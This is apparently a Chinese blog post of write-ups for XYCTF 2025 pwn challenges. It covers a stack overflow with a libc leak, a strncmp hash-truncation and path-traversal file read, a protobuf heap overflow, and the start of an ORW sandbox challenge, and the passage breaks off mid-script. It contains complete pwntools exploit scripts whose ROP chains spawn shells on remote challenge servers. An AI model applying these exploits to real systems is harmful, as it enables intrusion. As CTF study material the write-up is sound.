<p>这题我应该想复杂了，说是签到题，搞得非常麻烦，感觉是做过来偏难的题。首先最烦的是这个<strong>init</strong>函数设置标准输出是全缓冲，这直接导致我需要占满整个缓冲区才能在终端看到回显。这里我本地利用程序自带的输出先走53次就能使缓冲区临近溢出，而远程服务器需要214次才能快占满缓冲区。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406130641781.png"
                      class=""
                >
<p>主要的漏洞函数就是一个无限制的栈溢出，遇到换行符结束。需要注意的是，这里是一个字节一个字节读取，栈上有变量存当前读取下标，覆盖到该下标后就可以跳跃到返回地址进行覆盖。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406131116881.png"
                      class=""
                >
<p>麻烦的是如何泄露libc基址，这个程序里没有控rdi的gadget，而且动态调试时看到feof之后的寄存器状态也没有可利用的内容。我们需要想办法控制rdi为libc相关地址然后<strong>call
puts</strong>来泄露libc基址。这里我采用的是下面两个gadget的组合。首先第一次溢出先覆盖rbp，然后返回到<strong>revenge</strong>函数，这样可以让我们读取内容到可控的地址，这里我选择的是覆盖rbp为<strong>0x404900</strong>，然后就能往可控的地址处读入函数的<strong>got</strong>表地址或者在bss段的<strong>FILE</strong>结构体地址。这样之后就可以通过处于<strong>0x401274</strong>的gadget来控制eax，之后再利用init函数中setvbuf传参控制rdi，之后就能回到<strong>puts</strong>函数泄露libc地址。这里能成功地关键在于<strong>setvbuf</strong>函数非法调用结束后不会改变rdi的内容，这里的成功率为50%，调用时会把rdi中相关的内容与0x8000进行按位与提取位，可能会进入别的分支导致程序直接崩溃。</p>
<p>有了libc基址后记得返回时不要回到main函数开头，不知道为什么再次调用init函数后，之后输入就会出现问题。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406132515219.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406132529260.png"
                      class=""
                >
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line">main = <span class="number">0x000000000040127B</span></span><br><span class="line">puts_plt = <span class="number">0x0000000000401070</span></span><br><span class="line">call_puts = <span class="number">0x0000000000401294</span> </span><br><span class="line">fgets_plt = <span class="number">0x0000000000401080</span></span><br><span class="line">feof_plt = <span class="number">0x0000000000401090</span></span><br><span class="line">setvbuf_plt = <span class="number">0x00000000004010A0</span></span><br><span class="line">mov_rdi_rsi = <span class="number">0x0000000000401180</span></span><br><span class="line">puts_got = <span class="number">0x0000000000404018</span></span><br><span class="line">stderr = <span class="number">0x404080</span></span><br><span class="line">magic = <span class="number">0x00000000004011F0</span></span><br><span class="line">revenge = <span class="number">0x000000000040120E</span>        </span><br><span class="line">pop_rbp_ret = <span class="number">0x00000000004011FD</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./attachment&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;39.106.69.240&quot;</span>,<span class="number">30802</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 本地53次直接输出</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">214</span>):       </span><br><span class="line">    payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x218</span>,<span class="string">b&quot;\x00&quot;</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x220</span>+<span class="number">5</span>)</span><br><span class="line">    payload += p64(main)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x218</span>,<span class="string">b&quot;\x00&quot;</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x220</span>+<span class="number">5</span>)</span><br><span class="line">payload += p64(pop_rbp_ret) + p64(<span class="number">0x404900</span>) + p64(revenge)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">payload = p32(stderr)*<span class="number">6</span> + p64(mov_rdi_rsi) + p64(magic) + p64(<span class="number">0x404900</span>) + p64(puts_plt) + p64(<span class="number">0x40128D</span>) + p64(<span class="number">0x666</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x218</span>,<span class="string">b&quot;\x00&quot;</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x220</span>+<span class="number">5</span>)</span><br><span class="line">payload += p64(pop_rbp_ret) + p64(<span class="number">0x404900</span>-<span class="number">0x220</span>+<span class="number">0x10</span>) + p64(<span class="number">0x401274</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x21b6a0</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base: &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x000000000002a3e5</span></span><br><span class="line">ret = libc_base + <span class="number">0x0000000000029139</span></span><br><span class="line">bin_sh = libc_base + <span class="number">0x00000000001d8678</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x218</span>,<span class="string">b&quot;\x00&quot;</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x220</span>+<span class="number">5</span>)</span><br><span class="line">payload += p64(ret) + p64(pop_rdi_ret) + p64(bin_sh) + p64(system)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406215924045.png"
                      class=""
                >
<p>XYCTF{181826fe-77ab-4285-9c46-1c46fdbb93a2}</p>
<h4 id="pwn-web苦手">pwn-web苦手</h4>
<p>一个web
pwn题目，逻辑比较简单，但其实有点不像是pwn题。首先一开始会解析三个get参数。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406133932926.png"
                      class=""
                >
<p>然后看这里的主要逻辑，这里的hash函数是通过具体的加密特征得出的，问了ai可能是<strong>PBKDF2-HMAC-SHA1</strong>算法，然后有个函数会把加密后的内容保存到<strong>dk.dat</strong>文件，这个文件我们实际可以直接访问对应路由下载下来查看加密结果，这里的passwd_re实际re代表register，不能小于63字节。</p>
<p>后面的passwd_lo就相当于login了，会把读入的内容同样加密后和之前注册的进行比较，不能大于63字节。成功后就能够传出filename参数，读取<strong>filename.dat</strong>文件内容了。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406134028629.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406134238918.png"
                      class=""
                >
<p>这里一开始我想的是进行爆破相同的hash值，但后来发现比较用的是<strong>strncmp</strong>，可以被<strong></strong>截断，那我们直接爆破hash后首位为<strong></strong>的长短两个密码即可。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pbkdf2_once</span>(<span class="params">password, salt=<span class="string">&quot;XYCTF&quot;</span>, iterations=<span class="number">1</span>, dklen=<span class="number">32</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;使用 PBKDF2-HMAC 进行多次迭代计算&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.pbkdf2_hmac(<span class="string">&#x27;sha1&#x27;</span>, password.encode(), salt.encode(), iterations, dklen)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标 hash（先手动运行一次，得到 32 字节的 hash 进行验证算法是否正确）</span></span><br><span class="line"><span class="comment"># target_hash = pbkdf2_once(&quot;A&quot;*64)</span></span><br><span class="line"><span class="comment"># print(f&quot;Target hash: &#123;target_hash.hex()&#125;&quot;)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_matching_long_password</span>():</span><br><span class="line">    charset = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span></span><br><span class="line">    <span class="keyword">for</span> length <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>,<span class="number">70</span>):</span><br><span class="line">        <span class="keyword">for</span> pwd <span class="keyword">in</span> product(charset, repeat=length):</span><br><span class="line">            pwd = <span class="string">&quot;&quot;</span>.join(pwd)</span><br><span class="line">            <span class="keyword">if</span> pbkdf2_once(pwd)[<span class="number">0</span>] == <span class="number">0</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Found matching long password: <span class="subst">&#123;pwd&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_matching_short_password</span>():</span><br><span class="line">    <span class="comment"># 尝试爆破短密码</span></span><br><span class="line">    charset = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span></span><br><span class="line">    <span class="keyword">for</span> length <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">64</span>):</span><br><span class="line">        <span class="keyword">for</span> pwd <span class="keyword">in</span> product(charset, repeat=length):</span><br><span class="line">            pwd = <span class="string">&quot;&quot;</span>.join(pwd)</span><br><span class="line">            <span class="keyword">if</span> pbkdf2_once(pwd)[<span class="number">0</span>] == <span class="number">0</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Found matching password: <span class="subst">&#123;pwd&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">find_matching_long_password()          </span><br><span class="line">find_matching_short_password()</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406220110891.png"
                      class=""
                >
<p>然后可以去读文件，但是服务器上<strong>flag.dat</strong>里是fake_flag，这里注意到<code>snprintf(file, 0x10uLL, "/%s.dat", filename);</code>有长度限制，可以通过加长filename来最后截断<strong>.dat</strong>后缀，最终读<code>../../..//flag</code>即可。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406220227334.png"
                      class=""
                >
<p>XYCTF{837f56a3-160b-4fad-94ac-037166e2635d}</p>
<h4 id="pwn-bot">pwn-bot</h4>
<p>一个经典的protobuf题，首先去手动逆proto结构体，这题里有两个。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406135806428.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406135826050.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406135852679.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406135907187.png"
                      class=""
                >
<p>逆出来的结果如下，protobuf相关内容可见我<a
href="https://collectcrop.github.io/blog/2024/11/21/protobuf%E5%88%9D%E6%8E%A2/">博客</a>。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto2&quot;</span>;</span><br><span class="line"></span><br><span class="line">message Message_request&#123;</span><br><span class="line">    required int32 <span class="built_in">id</span> = <span class="number">1</span>;</span><br><span class="line">    required string sender = <span class="number">2</span>;</span><br><span class="line">    required uint32 <span class="built_in">len</span> = <span class="number">3</span>;</span><br><span class="line">    required <span class="built_in">bytes</span> content = <span class="number">4</span>;</span><br><span class="line">    required int32 actionid = <span class="number">5</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message Message_response&#123;</span><br><span class="line">    required int32 <span class="built_in">id</span> = <span class="number">1</span>;</span><br><span class="line">    required string receiver = <span class="number">2</span>;</span><br><span class="line">    required int32 status_code = <span class="number">3</span>;</span><br><span class="line">    optional string error_message = <span class="number">4</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>为了美观起见，这里我们在IDA中设置这两个结构体，然后把对应类型的变量改为我们自定义的结构体类型，好看一点。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406140114087.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406140204662.png"
                      class=""
                >
<p>主要功能一共有3个，其中我们要用到的只有action
1和2，0只是把我们输入的内容打印一遍（这里说不定可以劫持puts_got为system，但我没试）。其中action
1中会复制内容到我们指定id的chunk中，这里我们要先看一下这个堆块申请的逻辑。实际上申请的这个堆块分为管理块和数据块。管理块data域第一个是返回地址，而data域第二个内容就是指向数据块的data域。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406140338256.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406140433554.png"
                      class=""
                >
<p>由于在实际交互之前也alloc了2次，这里我们可以看前两堆块。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406140852376.png"
                      class=""
                >
<p>这里我们的1号功能实际上可以进行堆溢出改写。比如我可以指定id为0，然后溢出覆盖id为1的管理块的数据域指针。</p>
<p>2号功能可以打印出指定id管理块数据域指针指向的内容，最多使用2次。</p>
<p>那么我们可以先溢出部分覆盖1号管理块的数据域指针，使其指向0号管理块的返回地址（也就是libc相关地址），这里要覆盖两个字节，1/16概率，本地可以先关aslr进行调试。然后用2号功能得到libc基址。之后可以再次改写1号块的数据域指针为<strong>environ</strong>来泄露栈相关地址。</p>
<p>最后我们把1号块的数据域指针覆盖成栈上的返回地址，注意是进入<strong>cp</strong>具体<strong>memcpy</strong>实现函数的返回地址，因为我们实际上前面覆盖时把1号块的返回地址覆盖了，最后release时会检测到直接退出程序。然后对1号块调用1号功能就可以覆盖返回地址了，执行我们的rop链。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> message_pb2</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./bot&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;47.94.15.198&quot;</span>,<span class="number">20531</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">echo</span>(<span class="params">sender,content,<span class="built_in">id</span>=<span class="number">1</span>,<span class="built_in">len</span>=<span class="number">1</span></span>):</span><br><span class="line">    req = message_pb2.Message_request()		<span class="comment">#创建结构体</span></span><br><span class="line">    <span class="comment">#各字段赋值</span></span><br><span class="line">    req.<span class="built_in">id</span> = <span class="built_in">id</span></span><br><span class="line">    req.<span class="built_in">len</span> = <span class="built_in">len</span></span><br><span class="line">    req.sender = sender</span><br><span class="line">    req.content = content</span><br><span class="line">    req.actionid = <span class="number">0</span> </span><br><span class="line">    payload = req.SerializeToString()		<span class="comment">#转化成proto的序列化字符串</span></span><br><span class="line">    p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sendReq</span>(<span class="params"><span class="built_in">id</span>,sender,<span class="built_in">len</span>,content</span>):</span><br><span class="line">    req = message_pb2.Message_request()		<span class="comment">#创建结构体</span></span><br><span class="line">    <span class="comment">#各字段赋值</span></span><br><span class="line">    req.<span class="built_in">id</span> = <span class="built_in">id</span></span><br><span class="line">    req.<span class="built_in">len</span> = <span class="built_in">len</span></span><br><span class="line">    req.sender = sender</span><br><span class="line">    req.content = content</span><br><span class="line">    req.actionid = <span class="number">1</span></span><br><span class="line">    payload = req.SerializeToString()		<span class="comment">#转化成proto的序列化字符串</span></span><br><span class="line">    p.send(payload)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">botReply</span>(<span class="params"><span class="built_in">id</span>,sender=<span class="string">&quot;admin&quot;</span>,<span class="built_in">len</span>=<span class="number">1</span>,content=<span class="string">b&quot;a&quot;</span></span>):</span><br><span class="line">    req = message_pb2.Message_request()		<span class="comment">#创建结构体</span></span><br><span class="line">    <span class="comment">#各字段赋值</span></span><br><span class="line">    req.<span class="built_in">id</span> = <span class="built_in">id</span></span><br><span class="line">    req.<span class="built_in">len</span> = <span class="built_in">len</span></span><br><span class="line">    req.sender = sender</span><br><span class="line">    req.content = content</span><br><span class="line">    req.actionid = <span class="number">2</span></span><br><span class="line">    payload = req.SerializeToString()		<span class="comment">#转化成proto的序列化字符串</span></span><br><span class="line">    p.send(payload)   </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recv_protobuf</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot; 接收并解析服务器返回的 protobuf 数据 &quot;&quot;&quot;</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;TESTTESTTEST!\n&quot;</span>)</span><br><span class="line">    <span class="comment"># print(p.recvline())</span></span><br><span class="line">    response_data = p.recvline()[:-<span class="number">1</span>] </span><br><span class="line">    res = message_pb2.Message_response()</span><br><span class="line">    res.ParseFromString(response_data)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Received ID: <span class="subst">&#123;res.<span class="built_in">id</span>&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Received receiver: <span class="subst">&#123;res.receiver&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Received status_code: <span class="subst">&#123;res.status_code&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Received error_message: <span class="subst">&#123;res.error_message&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sendReq(<span class="number">0</span>,<span class="string">&quot;admin&quot;</span>,<span class="number">0x28</span>+<span class="number">2</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0x18</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)+p16(<span class="number">0x22a0</span>))</span><br><span class="line">botReply(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;BOT MSG&quot;</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x29d90</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">environ = libc_base + libc.symbols[<span class="string">&quot;environ&quot;</span>]</span><br><span class="line">ret = libc_base + <span class="number">0x0000000000029139</span></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x000000000002a3e5</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x000000000002be51</span></span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">bin_sh = libc_base + <span class="number">0x00000000001d8678</span></span><br><span class="line"></span><br><span class="line">sendReq(<span class="number">0</span>,<span class="string">&quot;admin&quot;</span>,<span class="number">0x30</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0x18</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)+p64(environ))</span><br><span class="line">botReply(<span class="number">1</span>)</span><br><span class="line">stack = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)) </span><br><span class="line">log.success(<span class="string">&quot;stack:&quot;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sendReq(<span class="number">0</span>,<span class="string">&quot;admin&quot;</span>,<span class="number">0x30</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0x18</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)+p64(stack-<span class="number">0x200</span>))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">sendReq(<span class="number">1</span>,<span class="string">&quot;admin&quot;</span>,<span class="number">0x20</span>,p64(ret)+p64(pop_rdi_ret)+p64(bin_sh)+p64(system))</span><br><span class="line"></span><br><span class="line"><span class="comment"># recv_protobuf()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406220530194.png"
                      class=""
                >
<p>XYCTF{eb7711df-94d9-4eb8-b94f-859dfaa638fe}</p>
<h4 id="pwn-奶龙回家">pwn-奶龙回家</h4>
<p>看沙箱，只能进行常规orw。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406125856838.png"
                      class=""
                >
<p>这题一开始给了栈上相关地址，但进行了随机偏移，不过因为是伪加密，所以可以确定这个偏移量。这里需要注意的是，用pwntools远程连接到服务器到这个程序<strong>time</strong>的运行会有一定延迟，所以我们本地算随机数种子时需要尝试加减一定的偏移量。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406121830285.png"
                      class=""
                >
<p>主要利用点在于有任意地址读和任意地址写，前面的v20的次数限制可以通过输入负数来进行<strong>type
confuse</strong>，（choice是int而v20是unsigned
int），然后v18的限制可以通过改写栈上变量来绕过。由于这题开了沙箱，所以不能进入调用system的分支。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406125556426.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/04/08/2025xyctf-wp/image-20250406125348724.png"
                      class=""
                >
<p>任意地址读可以读got表泄露libc基址，然后绕过上述两个限制后，就可以往栈上任意写了，直接写orw的rop链。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span 